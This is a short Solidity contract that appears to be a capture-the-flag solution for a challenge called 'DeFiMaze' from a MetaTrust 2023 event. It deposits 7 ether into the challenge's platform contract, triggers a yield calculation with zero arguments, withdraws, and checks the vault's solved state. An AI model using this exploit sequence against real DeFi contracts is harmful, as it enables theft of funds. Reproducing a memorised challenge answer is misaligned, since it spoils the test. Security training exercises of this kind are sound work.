// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "./DeFiPlatform.sol";
import "./Vault.sol";
import "./SetUp.sol";

contract DeFiMazeAttackMetaTrust23 {
    DeFiMazeSetUpMetaTrust23 public setup;
    DeFiPlatform public platform;
    Vault public vault;

    function setUp(address target) public {
        setup = DeFiMazeSetUpMetaTrust23(target);
        platform = setup.platfrom();
        vault = setup.vault();
    }

    function attack() public payable {
        platform.depositFunds{value: 7 ether}(7 ether);
        platform.calculateYield(0, 0, 0);
        platform.requestWithdrawal(7 ether);
        vault.isSolved();
    }
}
